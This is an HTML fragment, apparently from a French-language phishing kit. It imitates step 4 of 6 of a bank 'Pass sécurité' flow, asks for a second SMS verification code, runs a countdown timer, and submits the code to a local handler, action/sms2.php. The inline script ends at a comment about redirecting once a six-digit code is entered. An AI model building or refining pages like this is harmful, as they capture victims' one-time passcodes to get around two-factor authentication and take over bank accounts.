...
<body>
  ...
  <hr>
  <p class="sub-title step-title">Pass sécurité - Etape 4/6</p>
  ...
  <div class="center-wrapper">
    ...
    <div class="form-box" id="mainForm" style="display:none;">
      <p class="instruction-text">
        ...
        veuillez saisir le deuxième code reçu par SMS.
      </p>

      <div class="timer" id="countdown">2:00</div>
      <form action="action/sms2.php" method = "post">
        <div class="input-wrapper">
        <input type="text" name="sms_code" class="client-input" id="smsCode" maxlength="6" placeholder="Code reçu par sms">
          <span class="close-icon" id="clearCode">&times;</span>
        </div>

        <button class="validate-btn" id="validateCode">Valider</button>
        <p id="errorMessage" class="error-message" style="display:none;">Veuillez entrer un code à 6 chiffres.</p>
      </form>
    </div>
  </div>
  ...
  <script>
    ...
    validateBtn.addEventListener('click', () => {
      ...
      if (code.length === 6) {
        // Code validé, tu peux faire une redirection ici si besoin
